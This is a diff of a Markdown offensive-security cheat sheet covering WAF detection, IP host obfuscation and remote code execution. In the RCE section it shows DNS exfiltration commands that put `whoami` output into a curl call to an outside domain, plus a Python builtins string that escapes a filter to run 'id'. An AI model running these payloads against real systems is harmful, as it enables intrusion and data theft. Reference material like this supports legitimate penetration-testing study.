@@ -4,17 +4,7 @@
 
 ## What WAF does the application have?
 
-<img style="text-align:center"  height="180em" src="https://user-images.githubusercontent.com/54555784/188940369-41ab688c-15ff-41cf-ba44-95c0534753c9.png" />
-
-### Detection
-
--> Cookies
-
--> HTTP Response Messages
-
--> Rules
-
--> HTTP Status Code
+<img class="center" height="450em" src="https://user-images.githubusercontent.com/54555784/188940369-41ab688c-15ff-41cf-ba44-95c0534753c9.png" />
 
 ### Tools
 
@@ -35,15 +25,7 @@ https://github.com/0xInfection/Awesome-WAF
 
 ## Host Obfuscation
 
-#### Types
-
--> DWORD
-  
--> OCTAL 
-  
--> HEX
-  
--> HYBRID
+<img height="400em" src="https://user-images.githubusercontent.com/54555784/188944843-6cebbc3d-ace8-4c79-923c-4de8e18fbb64.png" />
 
 ### Tool  
 https://www.silisoftware.com/tools/ipconverter.php
@@ -1202,8 +1184,10 @@ https://nodejs.org/api/process.html
 
 ### RCE - Exfiltrating via dns
 
-`curl http://$(whoami).site.com/`  
-`curl http://`whoami`.site.com/`
+```
+curl http://$(whoami).site.com/
+curl http://`whoami`.site.com/
+```
    
 -> Tricks - Bypass  
 `"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";`
